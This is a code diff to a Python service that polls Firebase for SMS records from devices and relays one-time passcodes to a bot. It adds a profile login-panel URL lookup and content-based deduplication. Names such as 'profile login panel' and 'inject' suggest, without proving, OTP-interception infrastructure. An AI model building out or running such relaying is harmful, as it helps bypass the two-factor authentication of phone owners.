@@ -269,6 +269,24 @@ async def resolve_firebase_url_for_otp_poll(
     candidates = _firebase_url_candidates(profile, device)
     meta = _meta_dict(device)
 
+    from app.firebase_sync import get_profile_firebase_url
+
+    profile_panel = get_profile_firebase_url(profile)
+    if profile_panel:
+        panel_norm = normalize_firebase_url(profile_panel)
+        if await _messages_path_exists(panel_norm, device_id, timeout=timeout):
+            device.firebase_source_url = panel_norm
+            meta[SMS_FIREBASE_URL_META_KEY] = panel_norm
+            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
+            _save_meta(device, meta)
+            db.commit()
+            logger.info(
+                "OTP poll DB resolved device=%s url=%s (profile login panel)",
+                device_id,
+                panel_norm,
+            )
+            return panel_norm
+
     home = (
         normalize_firebase_url(device.firebase_source_url)
         if device.firebase_source_url
@@ -665,7 +683,8 @@ def _should_deliver_otp_record(
     """New SMS after monitor start; frozen push cutoff + seen (all senders, any Firebase path)."""
     if not _monitoring_baseline_done(device, profile):
         return False
-    if _record_dedup_key(record) in get_seen_sms_keys(device):
+    seen = get_seen_sms_keys(device)
+    if _record_dedup_key(record) in seen or _content_dedup_key(record) in seen:
         return False
     push_id = _message_push_id(record)
     cutoff = _baseline_push_cutoff(device)
@@ -776,6 +795,13 @@ def _record_dedup_key(record: dict[str, Any]) -> str:
         message = str(record.get("message") or "")
         return f"{firebase_key}|{sender}|{message}"
     return firebase_key
+
+
+def _content_dedup_key(record: dict[str, Any]) -> str:
+    """Same SMS from messages/ + lastSms + webhook → one bot card."""
+    sender = re.sub(r"\s+", "", (str(record.get("sender") or "")).strip().upper())
+    body = re.sub(r"\s+", " ", (str(record.get("message") or "")).strip())
+    return f"content:{sender}|{body}"
 
 
 def _is_sms_list_path(firebase_key: str) -> bool:
@@ -1362,9 +1388,17 @@ async def _fetch_paths_parallel(
 
 def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
     deduped: dict[str, dict[str, Any]] = {}
+    by_content: dict[str, dict[str, Any]] = {}
     for record in records:
         deduped[_record_dedup_key(record)] = record
-    return list(deduped.values())
+        ck = _content_dedup_key(record)
+        prev = by_content.get(ck)
+        if not prev:
+            by_content[ck] = record
+        else:
+            if (_message_push_id(record) or 0) > (_message_push_id(prev) or 0):
+                by_content[ck] = record
+    return list(by_content.values())
 
 
 def _build_hot_poll_paths(device: Device) -> list[str]:
@@ -1826,7 +1860,7 @@ async def _poll_messages_otp_only(
                     device_name=device.name,
                     received_at=record.get("received_at"),
                 )
-                mark_sms_keys_seen(device, {dedup})
+                mark_sms_keys_seen(device, {dedup, _content_dedup_key(record)})
                 delivered += 1
                 db.commit()
                 logger.warning(
@@ -1844,7 +1878,7 @@ async def _poll_messages_otp_only(
             device_name=device.name,
             received_at=record.get("received_at"),
         )
-        mark_sms_keys_seen(device, {dedup})
+        mark_sms_keys_seen(device, {dedup, _content_dedup_key(record)})
         mark_inject_done_keys(device, {dedup})
         delivered += 1
         db.commit()
